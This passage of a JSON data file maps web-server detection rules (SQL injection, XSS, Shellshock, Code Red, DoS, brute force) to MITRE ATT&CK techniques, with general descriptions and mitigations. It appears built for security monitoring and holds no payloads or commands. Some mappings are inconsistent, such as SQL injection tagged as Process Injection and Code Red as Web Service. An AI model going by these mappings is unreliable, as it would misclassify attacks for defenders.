            "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery]( or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB  and RDP  as well as applications that may be used within internal networks such as MySQL  and web server services.\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation]( as a result of lateral movement exploitation as well."
        ],
        "mitigation_strategies": [
            "Regularly scan the internal network for available services to identify new and potentially vulnerable services."
        ]
    },
    {
        "rule_id": 31109,
        "rule_description": "MSSQL Injection attempt (/ur.php, urchin.js)",
        "mitre_id": [
            "T1190"
        ],
        "possible_attacks": [
            "Exploit Public-Facing Application"
        ],
        "description": [
            "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets. Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion]( or [Exploitation for Client Execution](\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via the [Cloud Instance Metadata API]( exploit container host access via [Escape to Host]( or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities."
        ],
        "mitigation_strategies": [
            "Regularly scan externally facing systems for vulnerabilities and establish procedures to rapidly patch systems when critical vulnerabilities are discovered through scanning and through public disclosure."
        ]
    },
    {
        "rule_id": 31115,
        "rule_description": "URL too long. Higher than allowed on most",
        "mitre_id": [
            "T1499"
        ],
        "possible_attacks": [
            "Endpoint Denial of Service"
        ],
        "description": [
            "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](\n"
        ],
        "mitigation_strategies": [
            "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies."
        ]
    },
    {
        "rule_id": 31151,
        "rule_description": "Multiple web server 400 error codes",
        "mitre_id": [
            "T1595.002"
        ],
        "possible_attacks": [
            "Vulnerability Scanning"
        ],
        "description": [
            "Adversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use.\n\nThese scans may also include more broad attempts to [Gather Victim Host Information]( that can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts. Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains]( or [Search Open Technical Databases]( establishing operational resources (ex: [Develop Capabilities]( or [Obtain Capabilities]( and/or initial access (ex: [Exploit Public-Facing Application]("
        ],
        "mitigation_strategies": [
            "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."
        ]
    },
    {
        "rule_id": 31152,
        "rule_description": "Multiple SQL injection attempts from same",
        "mitre_id": [
            "T1055"
        ],
        "possible_attacks": [
            "Process Injection"
        ],
        "description": [
            "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. "
        ],
        "mitigation_strategies": [
            "Utilize Yama (ex: /proc/sys/kernel/yama/ptrace_scope) to mitigate ptrace based process injection by restricting the use of ptrace to privileged users only. Other mitigation controls involve the deployment of security kernel modules that provide advanced access control and process restrictions such as SELinux, grsecurity, and AppArmor."
        ]
    },
    {
        "rule_id": 31153,
        "rule_description": "Multiple common web attacks from same source ip.",
        "mitre_id": [
            "T1055",
            "T1083"
        ],
        "possible_attacks": [
            "Process Injection"
        ],
        "description": [
            "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. "
        ],
        "mitigation_strategies": [
            "Utilize Yama (ex: /proc/sys/kernel/yama/ptrace_scope) to mitigate ptrace based process injection by restricting the use of ptrace to privileged users only. Other mitigation controls involve the deployment of security kernel modules that provide advanced access control and process restrictions such as SELinux, grsecurity, and AppArmor."
        ]
    },
    {
        "rule_id": 31154,
        "rule_description": "Multiple XSS (Cross Site Scripting) attempts",
        "mitre_id": [
            "T1059"
        ],
        "possible_attacks": [
            "Command and Scripting Interpreter"
        ],
        "description": [
            "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell]( while Windows installations include the [Windows Command Shell]( and [PowerShell](\n\nThere are also cross-platform interpreters such as [Python]( as well as those commonly associated with client applications such as [JavaScript]( and [Visual Basic](\n\nAdversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access]( payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services]( in order to achieve remote Execution."
        ],
        "mitigation_strategies": [
            "Script blocking extensions can help prevent the execution of scripts and HTA files that may commonly be used during the exploitation process. For malicious code served up through ads, adblockers can help prevent that code from executing in the first place."
        ]
    },
    {
        "rule_id": 31161,
        "rule_description": "Multiple web server 501 error code (Not Implemented).",
        "mitre_id": [
            "T1595.002"
        ],
        "possible_attacks": [
            "Vulnerability Scanning"
        ],
        "description": [
            "Adversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use.\n\nThese scans may also include more broad attempts to [Gather Victim Host Information]( that can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts. Information from these scans may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains]( or [Search Open Technical Databases]( establishing operational resources (ex: [Develop Capabilities]( or [Obtain Capabilities]( and/or initial access (ex: [Exploit Public-Facing Application]("
        ],
        "mitigation_strategies": [
            "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."
        ]
    },
    {
        "rule_id": 31163,
        "rule_description": "Multiple web server 503 error code (Service unavailable).",
        "mitre_id": [
            "T1498"
        ],
        "possible_attacks": [
            "Network Denial of Service"
        ],
        "description": [
            "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service]("
        ],
        "mitigation_strategies": [
            "When flood volumes exceed the capacity of the network connection being targeted, it is typically necessary to intercept the incoming traffic upstream to filter out the attack traffic from the legitimate traffic. Such defenses can be provided by the hosting Internet Service Provider (ISP) or by a 3rd party such as a Content Delivery Network (CDN) or providers specializing in DoS mitigations.\n\nDepending on flood volume, on-premises filtering may be possible by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport.\n\nAs immediate response may require rapid engagement of 3rd parties, analyze the risk associated to critical resources being affected by Network DoS attacks and create a disaster recovery plan/business continuity plan to respond to incidents."
        ]
    },
    {
        "rule_id": 31164,
        "rule_description": "SQL injection attempt.",
        "mitre_id": [
            "T1055",
            "T1190"
        ],
        "possible_attacks": [
            "Process Injection",
            "Exploit Public-Facing Application"
        ],
        "description": [
            "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
            "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets. Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion]( or [Exploitation for Client Execution](\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via the [Cloud Instance Metadata API]( exploit container host access via [Escape to Host]( or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities."
        ],
        "mitigation_strategies": [
            "Utilize Yama (ex: /proc/sys/kernel/yama/ptrace_scope) to mitigate ptrace based process injection by restricting the use of ptrace to privileged users only. Other mitigation controls involve the deployment of security kernel modules that provide advanced access control and process restrictions such as SELinux, grsecurity, and AppArmor.",
            "Regularly scan externally facing systems for vulnerabilities and establish procedures to rapidly patch systems when critical vulnerabilities are discovered through scanning and through public disclosure."
        ]
    },
    {
        "rule_id": 31165,
        "rule_description": "SQL injection attempt.",
        "mitre_id": [
            "T1055",
            "T1190"
        ],
        "possible_attacks": [
            "Process Injection",
            "Exploit Public-Facing Application"
        ],
        "description": [
            "Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ",
            "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets. Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion]( or [Exploitation for Client Execution](\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via the [Cloud Instance Metadata API]( exploit container host access via [Escape to Host]( or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities."
        ],
        "mitigation_strategies": [
            "Utilize Yama (ex: /proc/sys/kernel/yama/ptrace_scope) to mitigate ptrace based process injection by restricting the use of ptrace to privileged users only. Other mitigation controls involve the deployment of security kernel modules that provide advanced access control and process restrictions such as SELinux, grsecurity, and AppArmor.",
            "Regularly scan externally facing systems for vulnerabilities and establish procedures to rapidly patch systems when critical vulnerabilities are discovered through scanning and through public disclosure."
        ]
    },
    {
        "rule_id": 31166,
        "rule_description": "Shellshock attack attempt",
        "mitre_id": [
            "T1068",
            "T1190"
        ],
        "possible_attacks": [
            "Exploitation for Privilege Escalation",
            "Exploit Public-Facing Application"
        ],
        "description": [
            "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD). Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer]( or [Lateral Tool Transfer](",
            "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets. Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion]( or [Exploitation for Client Execution](\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via the [Cloud Instance Metadata API]( exploit container host access via [Escape to Host]( or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities."
        ],
        "mitigation_strategies": [
            "Update software regularly by employing patch management for internal enterprise endpoints and servers.",
            "Regularly scan externally facing systems for vulnerabilities and establish procedures to rapidly patch systems when critical vulnerabilities are discovered through scanning and through public disclosure."
        ]
    },
    {
        "rule_id": 31167,
        "rule_description": "Shellshock attack attempt",
        "mitre_id": [
            "T1068",
            "T1190"
        ],
        "possible_attacks": [
            "Exploitation for Privilege Escalation",
            "Exploit Public-Facing Application"
        ],
        "description": [
            "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD). Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer]( or [Lateral Tool Transfer](",
            "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets. Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion]( or [Exploitation for Client Execution](\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via the [Cloud Instance Metadata API]( exploit container host access via [Escape to Host]( or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities."
        ],
        "mitigation_strategies": [
            "Update software regularly by employing patch management for internal enterprise endpoints and servers.",
            "Regularly scan externally facing systems for vulnerabilities and establish procedures to rapidly patch systems when critical vulnerabilities are discovered through scanning and through public disclosure."
        ]
    },
    {
        "rule_id": 31168,
        "rule_description": "Shellshock attack detected",
        "mitre_id": [
            "T1068",
            "T1190"
        ],
        "possible_attacks": [
            "Exploitation for Privilege Escalation",
            "Exploit Public-Facing Application"
        ],
        "description": [
            "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD). Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer]( or [Lateral Tool Transfer](",
            "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets. Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion]( or [Exploitation for Client Execution](\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via the [Cloud Instance Metadata API]( exploit container host access via [Escape to Host]( or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities."
        ],
        "mitigation_strategies": [
            "Update software regularly by employing patch management for internal enterprise endpoints and servers.",
            "Regularly scan externally facing systems for vulnerabilities and establish procedures to rapidly patch systems when critical vulnerabilities are discovered through scanning and through public disclosure."
        ]
    },
    {
        "rule_id": 31169,
        "rule_description": "Shellshock attack detected",
        "mitre_id": [
            "T1068",
            "T1190"
        ],
        "possible_attacks": [
            "Exploitation for Privilege Escalation",
            "Exploit Public-Facing Application"
        ],
        "description": [
            "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD). Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer]( or [Lateral Tool Transfer](",
            "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets. Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion]( or [Exploitation for Client Execution](\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via the [Cloud Instance Metadata API]( exploit container host access via [Escape to Host]( or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities."
        ],
        "mitigation_strategies": [
            "Update software regularly by employing patch management for internal enterprise endpoints and servers.",
            "Regularly scan externally facing systems for vulnerabilities and establish procedures to rapidly patch systems when critical vulnerabilities are discovered through scanning and through public disclosure."
        ]
    },
    {
        "rule_id": 30107,
        "rule_description": "Apache: Code Red attack.",
        "mitre_id": [
            "T1102"
        ],
        "possible_attacks": [
            "Web Service"
        ],
        "description": [
            "Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites, cloud services, and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google, Microsoft, or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed)."
        ],
        "mitigation_strategies": [
            "Web proxies can be used to enforce external network communication policy that prevents use of unauthorized external services."
        ]
    },
    {
        "rule_id": 30116,
        "rule_description": "Apache: Multiple Invalid URI requests from same source.",
        "mitre_id": [
            "T1499"
        ],
        "possible_attacks": [
            "Endpoint Denial of Service"
        ],
        "description": [
            "Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes and to support other malicious activities, including distraction, hacktivism, and extortion.\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](\n"
        ],
        "mitigation_strategies": [
            "Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies."
        ]
    },
    {
        "rule_id": 30119,
        "rule_description": "ModSecurity: Multiple attempts blocked.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
            "Proactively reset accounts that are known to be part of breached credentials either immediately, or after detecting bruteforce attempts."
        ]
    },
    {
        "rule_id": 30202,
        "rule_description": "ModSecurity: Multiple attempts blocked.",
        "mitre_id": [
            "T1110"
        ],
        "possible_attacks": [
            "Brute Force"
        ],
        "description": [
            "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\n\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to [Valid Accounts]( within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as [OS Credential Dumping]( [Account Discovery]( or [Password Policy Discovery]( Adversaries may also combine brute forcing activity with behaviors such as [External Remote Services]( as part of Initial Access."
        ],
        "mitigation_strategies": [
